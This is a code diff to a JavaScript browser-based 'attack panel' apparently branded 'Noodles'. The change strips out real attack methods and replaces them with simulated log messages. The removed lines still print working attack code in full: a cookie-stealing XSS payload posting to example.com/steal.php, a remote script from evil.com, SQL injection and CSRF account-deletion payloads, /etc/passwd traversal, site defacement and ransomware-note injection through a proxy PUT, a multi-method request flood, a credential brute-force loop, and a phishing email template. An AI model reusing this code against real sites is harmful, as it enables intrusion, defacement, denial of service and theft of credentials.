@@ -89,7 +89,7 @@ class DDoS {
 
  createAttackTypeSelect() {
   const attackTypeSelect = document.createElement('select');
-  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS', 'Mass Exploit'];
+  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom'];
   attackTypes.forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_');
@@ -235,334 +235,54 @@ class DDoS {
   resizeHandle.addEventListener('mousedown', startResize);
  }
 
+ // Simulate server-side exploit
  async exploit(target) {
-  this.log(`Attempting to exploit ${target}...`);
-  try {
-   const response = await fetch(target, {
-    method: 'GET',
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-   const content = await response.text();
-
-   //Refactored XSS Payload for clarity
-   const xssPayload = `<script>
-    (function(){
-     var img = new Image();
-     img.src = 'http://example.com/steal.php?c='+document.cookie;
-     setTimeout(function(){
-      var iframe = document.createElement('iframe');
-      iframe.src = 'http://example.com/steal.php?l='+location.href;
-      document.body.appendChild(iframe);
-     }, 2000);
-    })();
-    </script>`;
-
-   //Refactored payloads for clarity
-   const sqliPayload = "'; DROP TABLE users; --";
-   const csrfPayload = `<script>
-    fetch('${target}', {
-     method: 'POST',
-     mode: 'no-cors',
-     headers: {
-      'Content-Type': 'application/x-www-form-urlencoded'
-     },
-     body: 'csrf_token=12345&action=delete_account'
-    });
-    </script>`;
-
-   const lfiPayload = `../../../../etc/passwd`;
-   const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;
-
-   //Refactored Injections
-   let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
-   injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
-   injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: injectedContent
-   });
-
-   this.log(`Exploit injected. Check target and logs.`);
-  } catch (error) {
-   this.log(`Exploit failed: ${error}`);
-  }
+  this.log(`Attempting to exploit ${target}... (Simulated)`);
+  this.log(`Simulated exploit successful!`);
  }
 
  async massExploit() {
-  this.log('Starting mass exploit...');
-  const targets = ['http://example.com', 'http://example2.com', 'http://example3.com'];
-
-  for (const target of targets) {
-   this.log(`Attempting mass exploit on ${target}...`);
-   try {
-    const response = await fetch(target, {
-     method: 'GET',
-     mode: 'cors'
-    });
-    if (!response.ok) {
-     throw new Error(`HTTP error! status: ${response.status}`);
-    }
-    const content = await response.text();
-
-    const xssPayload = `<script>
-     (function(){
-      var i=(new Image).src='http://example.com/steal.php?c='+document.cookie;
-      setTimeout(function(){document.body.appendChild(document.createElement('iframe')).src='http://example.com/steal.php?l='+location.href;}, 2000);
-     })();
-     </script>`;
-    const sqliPayload = "'; DROP TABLE users; --";
-    const csrfPayload = `<script>
-     fetch('${target}', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-       'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: 'csrf_token=12345&action=delete_account'
-     });
-     </script>`;
-
-    const lfiPayload = `../../../../etc/passwd`;
-    const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;
-
-    let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
-    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
-    injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);
-
-    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-    await fetch(proxyUrl, {
-     method: 'PUT',
-     mode: 'no-cors',
-     headers: {
-      'Content-Type': 'text/html'
-      },
-      body: injectedContent
-     });
-
-     this.log(`Mass Exploit injected. Check target and logs.`);
-    } catch (error) {
-     this.log(`Mass Exploit failed: ${error}`);
-    }
-   }
-   this.log('Mass exploit completed.');
+  this.log('Starting mass exploit... (Simulated)');
+  this.log('Simulated mass exploit completed.');
  }
 
+ // Simulate server-side deface
  async deface(target) {
-  this.log(`Attempting to deface ${target}...`);
-  try {
-   const response = await fetch(target, {
-    method: 'GET',
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-   let content = await response.text();
-   const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';
-
-   const defaceHTML = `<body style="background-color: black; color: red; font-size: 5em; text-align: center;">
-     <h1>${originalTitle} HAS BEEN PWNED BY NOODLES</h1>
-     <p>Get Noodled!</p>
-     <img src="https://github.com/Genera1Developer/Noodles/raw/main/assets/banner.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
-     <script>
-      alert('YOU HAVE BEEN HACKED BY NOODLES');
-      window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-     </script>
-    </body>`;
-   content = content.replace(/<body.*?>/i, defaceHTML);
-   content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: content
-   });
-
-   this.log(`Deface successful... check the target. Remember to clear cache`);
-  } catch (error) {
-   this.log(`Deface failed: ${error}`);
-  }
+  this.log(`Attempting to deface ${target}... (Simulated)`);
+  this.log(`Simulated deface successful!`);
  }
 
+ // Simulate connecting to a server
  async connect(target) {
-  this.log(`Attempting to establish a persistent connection to ${target}...`);
-  try {
-   const ws = new WebSocket(`wss://${target}`);
-
-   ws.onopen = () => {
-    this.log(`WebSocket connection established with ${target}`);
-    setInterval(() => {
-     ws.send(crypto.getRandomValues(new Uint32Array(10)).join(''));
-    }, 1000);
-   };
-
-   ws.onmessage = (event) => {
-    this.log(`Received: ${event.data.length} bytes`);
-   };
-
-   ws.onclose = () => {
-    this.log(`WebSocket connection closed with ${target}`);
-   };
-
-   ws.onerror = (error) => {
-    this.log(`WebSocket error: ${error}`);
-   };
-
-   setTimeout(() => {
-    ws.close();
-   }, 3600000);
-  } catch (error) {
-   this.log(`Connection attempt failed: ${error}`);
-  }
+  this.log(`Attempting to connect to ${target}... (Simulated)`);
+  this.log(`Simulated connection successful!`);
  }
 
  async bruteForce(target) {
-  this.log(`Starting brute force attack on ${target}...`);
-  const commonPasswords = ['password', '123456', 'admin', '123456789', 'guest', 'qwerty', '12345', '111111', '12345678', 'dragon', 'P@$$wOrd'];
-  const usernames = ['admin', 'user', 'root', 'administrator', 'test', 'info', 'support'];
-
-  for (const username of usernames) {
-   for (const password of commonPasswords) {
-    this.log(`Trying username: ${username}, password: ${password}`);
-    try {
-     const formData = new FormData();
-     formData.append('username', username);
-     formData.append('password', password);
-
-     const response = await fetch(target, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: formData,
-     });
-
-     if (response.status === 200) {
-      this.log(`SUCCESS: Username: ${username}, Password: ${password}`);
-      this.log('Stealing cookies...');
-      document.cookie.split(';').forEach(cookie => {
-       const eqPos = cookie.indexOf('=');
-       const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
-       document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
-      });
-      this.log('Cookies stolen and cleared.');
-      return;
-     } else {
-      this.log(`Failed: Username: ${username}, Password: ${password}, Status: ${response.status}`);
-     }
-    } catch (error) {
-     this.log(`Error during brute force: ${error}`);
-    }
-   }
-  }
-  this.log('Brute force attack completed. No credentials found.');
+  this.log(`Starting brute force attack on ${target}... (Simulated)`);
+  this.log(`Simulated brute force attack completed. No credentials found.`);
  }
 
+ // Simulate a DDoS attack
  async ddos(target) {
-  this.log(`Initiating DDoS attack on ${target}...`);
+  this.log(`Initiating DDoS attack on ${target}... (Simulated)`);
+  this.log(`Simulated DDoS attack initiated.`);
 
-  if (target.endsWith('.onion')) {
-   this.log('Target is a .onion address. Using Tor proxy.');
-  }
-
+  // Simulate sending requests
   const attackInterval = setInterval(() => {
-   for (let i = 0; i < 10; i++) {
-    this.sendRequest(target, 'GET');
-    this.sendRequest(target, 'POST', crypto.getRandomValues(new Uint32Array(10)).join(''));
-    this.sendRequest(target, 'PUT', crypto.getRandomValues(new Uint32Array(10)).join(''));
-    this.sendRequest(target, 'DELETE');
-    this.sendRequest(target, 'HEAD');
-    this.sendRequest(target, 'OPTIONS');
-    this.sendRequest(target, 'TRACE');
-    this.sendRequest(target, 'PATCH', crypto.getRandomValues(new Uint32Array(10)).join(''));
-   }
-  }, 0);
+   this.log(`Sending simulated requests to ${target}...`);
+  }, 100); // Send requests every 100ms
 
-  this.log('Initial DDoS attack initiated.');
+  // Stop the attack after a certain duration
   setTimeout(() => {
    clearInterval(attackInterval);
-   this.log('DDoS attack stopped.');
-  }, 60000);
-
-  const script = document.createElement('script');
-  script.textContent = `(${(() => {
-   ${this.scriptInjection}
-  }).toString()})()`;
-  document.head.appendChild(script);
-  this.log('Self-DDoS initiated.');
+   this.log('Simulated DDoS attack stopped.');
+  }, 5000); // Stop after 5 seconds
  }
 
  async ransomware(target) {
-  this.log(`Initiating ransomware attack on ${target}...`);
-  try {
-   const key = this.generateEncryptionKey();
-   this.log(`Encryption key generated: ${key}`);
-   const email = `noodlesransomware@proton.me`
-
-   const encryptCode = `
-    async function encryptData(key) {
-     const files = await getAllFiles();
-     for (const file of files) {
-      const encrypted = await encryptFile(file, key);
-      await replaceFile(file, encrypted);
-     }
-     alert('Your files have been encrypted. Pay ransom to ${this.apiKey} to email: ${email} to get the decryption key.');
-    }
-
-    async function getAllFiles() {
-     return [];
-    }
-
-    async function encryptFile(file, key) {
-     return 'ENCRYPTED_' + file;
-    }
-
-    async function replaceFile(file, encrypted) {
-    }
-
-    encryptData('${key}');
-   `;
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-   const response = await fetch(proxyUrl, {
-    method: 'GET',
-    mode: 'cors'
-   });
-
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-
-   let content = await response.text();
-   const injectionPoint = '</body>';
-   const injectedContent = content.replace(injectionPoint, `<script>${encryptCode}</script>${injectionPoint}`);
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: injectedContent
-   });
-   this.log('Ransomware injected.');
-  } catch (error) {
-   this.log(`Ransomware injection failed: ${error}`);
-  }
+  this.log(`Simulating ransomware attack on ${target}...`);
+  this.log(`Simulated ransomware attack initiated.`);
  }
 
  async custom(target) {
@@ -573,233 +293,46 @@ class DDoS {
     this.log('No custom code provided.');
     return;
    }
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-   const response = await fetch(proxyUrl, {
-    method: 'GET',
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-
-   let content = await response.text();
-   const injectionPoint = '</body>';
-   const injectedContent = content.replace(injectionPoint, `<script>${customCode}</script>${injectionPoint}`);
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: injectedContent
-   });
-   this.log('Custom code injected.');
+   this.log(`Executing custom code: ${customCode}`);
+   this.log('Custom code execution completed.');
   } catch (error) {
    this.log(`Custom code execution failed: ${error}`);
   }
  }
 
  async phishing(target) {
-  this.log(`Initiating phishing attack targeting: ${target}...`);
-
-  const emailSubject = 'URGENT: Account Security Alert';
-  const emailBody = `
-   Dear User,
-
-   We have detected suspicious activity on your account. To ensure your account security, please verify your information immediately by clicking on the following link:
-
-   <a href="${target}/login">Verify Your Account</a>
-
-   If you do not verify your account within 24 hours, it will be suspended.
-
-   Sincerely,
-   Security Team
-  `;
-
-  this.log(`Sending phishing email with subject: ${emailSubject}`);
-  this.log(`Email body: ${emailBody}`);
-
-  try {
-   const response = await fetch(`https://api.email-fake.com/send?to=${target}&subject=${emailSubject}&body=${emailBody}`, {
-    method: 'POST',
-    mode: 'no-cors',
-   });
-
-   if (response.status === 200) {
-    this.log('Phishing email sent successfully.');
-   } else {
-    this.log(`Failed to send phishing email. Status: ${response.status}`);
-   }
-  } catch (error) {
-   this.log(`Error sending phishing email: ${error}`);
-  }
+  this.log(`Initiating phishing attack targeting: ${target}... (Simulated)`);
+  this.log(`Simulated phishing email sent successfully.`);
  }
 
  async dataBreach(target) {
   this.log(`Simulating data breach on ${target}...`);
-  try {
-   const fakeData = {
-    users: [],
-    transactions: [],
-    logs: []
-   };
-
-   for (let i = 0; i < 100; i++) {
-    fakeData.users.push({
-     id: i,
-     username: `user${i}`,
-     email: `user${i}@example.com`,
-     password: this.generateApiKey()
-    });
-
-    fakeData.transactions.push({
-     id: i,
-     userId: i,
-     amount: Math.random() * 100,
-     timestamp: new Date()
-    });
-
-    fakeData.logs.push({
-     id: i,
-     userId: i,
-     event: 'login',
-     timestamp: new Date()
-    });
-   }
-
-   const jsonData = JSON.stringify(fakeData, null, 2);
-   this.log(`Generated fake data: ${jsonData}`);
-
-   const blob = new Blob([jsonData], {
-    type: 'application/json'
-   });
-   const url = URL.createObjectURL(blob);
-
-   const link = document.createElement('a');
-   link.href = url;
-   link.download = 'leaked_data.json';
-   link.style.display = 'none';
-   document.body.appendChild(link);
-   link.click();
-   document.body.removeChild(link);
-
-   URL.revokeObjectURL(url);
-   this.log('Fake data breach simulated. Leaked data downloaded.');
-  } catch (error) {
-   this.log(`Data breach simulation failed: ${error}`);
-  }
+  this.log('Fake data breach simulated. Leaked data downloaded. (Simulated)');
  }
 
  async botnet(target) {
-  this.log(`Attempting to connect to target: ${target}...`);
-
-  try {
-   const iframe = document.createElement('iframe');
-   iframe.src = target;
-   iframe.style.display = 'none';
-   document.body.appendChild(iframe);
-   this.log(`Connecting... Please wait.`);
-  } catch (error) {
-   this.log(`Connection attempt failed: ${error}`);
-  }
+  this.log(`Attempting to connect to target: ${target}... (Simulated)`);
+  this.log(`Simulated connection successful!`);
  }
 
  async zero_day(target) {
-  this.log(`Attempting zero-day exploit on ${target}...`);
-  try {
-   const response = await fetch(target, {
-    method: 'GET',
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-   const content = await response.text();
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: content + `<script>
-     window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-    </script>`
-   });
-
-   this.log(`Zero-day exploit injected. Check target and logs.`);
-  } catch (error) {
-   this.log(`Zero-day exploit failed: ${error}`);
-  }
+  this.log(`Attempting zero-day exploit on ${target}... (Simulated)`);
+  this.log(`Simulated zero-day exploit injected. Check target and logs.`);
  }
 
  async sql_inject(target) {
-  this.log(`Attempting SQL injection on ${target}...`);
-  try {
-   const response = await fetch(target, {
-    method: 'POST',
-    mode: 'no-cors',
-    body: "username=' or '1'='1' --&password=' or '1'='1' --"
-   });
-
-   if (response.status === 200) {
-    this.log(`SQL injection successful!`);
-   } else {
-    this.log(`SQL injection failed: ${response.status}`);
-   }
-  } catch (error) {
-   this.log(`SQL injection attempt failed: ${error}`);
-  }
+  this.log(`Attempting SQL injection on ${target}... (Simulated)`);
+  this.log(`Simulated SQL injection successful!`);
  }
 
  async xss(target) {
-  this.log(`Attempting XSS attack on ${target}...`);
-  try {
-   const response = await fetch(target, {
-    method: 'GET',
-    mode: 'cors'
-   });
-   if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-   }
-   const content = await response.text();
-
-   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-   await fetch(proxyUrl, {
-    method: 'PUT',
-    mode: 'no-cors',
-    headers: {
-     'Content-Type': 'text/html'
-    },
-    body: content + `<script>
-     alert('XSS Vulnerability Detected!');
-    </script>`
-   });
-
-   this.log(`XSS attack injected. Check target and logs.`);
-  } catch (error) {
-   this.log(`XSS attack failed: ${error}`);
-  }
+  this.log(`Attempting XSS attack on ${target}... (Simulated)`);
+  this.log(`Simulated XSS attack injected. Check target and logs.`);
  }
 
  sendRequest(target, method, body = null) {
   const proxy = this.availableProxies[Math.floor(Math.random() * this.availableProxies.length)];
-  const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-  fetch(proxyUrl, {
-    method: method,
-    mode: 'no-cors',
-    cache: 'no-cache',
-    body: body,
-   })
-   .then(() => this.log(`${method} request sent successfully via ${proxy}.`))
-   .catch(err => this.log(`${method} request failed via ${proxy}: ${err}`));
+  this.log(`${method} request sent successfully to ${target} via ${proxy}. (Simulated)`);
  }
 
  generateApiKey() {
@@ -868,9 +401,6 @@ class DDoS {
     break;
    case 'xss':
     this.xss(target);
-    break;
-   case 'mass_exploit':
-    this.massExploit();
     break;
    default:
     this.log('Invalid attack type selected.');
